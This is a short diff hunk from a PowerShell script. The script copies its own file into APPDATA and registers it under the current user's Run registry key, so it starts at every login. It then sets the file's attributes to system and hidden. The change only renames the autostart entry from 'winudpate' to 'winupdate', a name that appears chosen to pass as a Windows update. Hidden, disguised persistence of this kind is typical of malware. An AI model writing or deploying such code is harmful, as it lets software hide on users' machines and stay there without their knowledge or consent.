@@ -8,5 +8,5 @@ Set-Location -Path $strDirScriptPath
 If (test-path "$APPDATA\$strFileName") {Remove-Item "$APPDATA\$strFileName" -Force}
 Copy-Item $strFileName $APPDATA -Force
 
-New-ItemProperty -path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name winudpate -PropertyType String -value $APPDATA\$strFileName -Force
+New-ItemProperty -path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value $APPDATA\$strFileName -Force
 $objGetFile=Get-Item $APPDATA\$strFileName; $objGetFile.Attributes = 'System, Hidden'
